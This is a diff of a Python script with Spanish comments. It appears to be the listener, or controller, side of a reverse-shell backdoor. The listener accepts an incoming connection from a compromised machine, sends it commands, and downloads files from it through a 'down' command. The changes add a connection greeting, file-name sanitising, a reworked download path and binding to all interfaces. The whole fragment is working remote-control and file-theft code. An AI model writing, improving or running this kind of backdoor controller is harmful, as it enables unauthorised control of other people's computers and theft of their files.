@@ -2,6 +2,8 @@ import base64
 import socket
 import json
 import optparse
+import os
+import tqdm
 
 def getArguments():
     parser = optparse.OptionParser()
@@ -20,6 +22,7 @@ class Listener:
         print('Servidor inicializado, esperando por conexiones')
         self.connection, address = listener.accept() #Aceptar conexiones
         print(f'[+]Conexión establecida con {address}\n')
+        self.reliableSend(b'Conexion establecida')
 
     #Es importante mantener una integridad de los datos, 
     #es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
@@ -51,6 +54,7 @@ class Listener:
             return json.loads(jsonData)
 
     def writeFile(self, path, route, content):
+        path = os.path.basename(path)
         contentToWrite = base64.b64decode(content)
         if contentToWrite != b'[-]Archivo no encontrado':
             with open(f'{route}{path}', 'wb') as file:
@@ -79,7 +83,7 @@ class Listener:
                 command = command.split(' ')                
 
                 if command[0] == 'down':
-                    contentFile = self.reliableSend(command)
+                    contentFile = self.remoteAction(command)
                     result = self.writeFile(' '.join(command[2:]), command[1], contentFile)
 
                 elif command[0] == 'up':
@@ -94,8 +98,8 @@ class Listener:
                 print(result)
 
 options = getArguments()
-listener = Listener(options.serverIp, int(options.serverPort))
 try:
+    listener = Listener('', int(options.serverPort))
     listener.run()
 
 except KeyboardInterrupt:
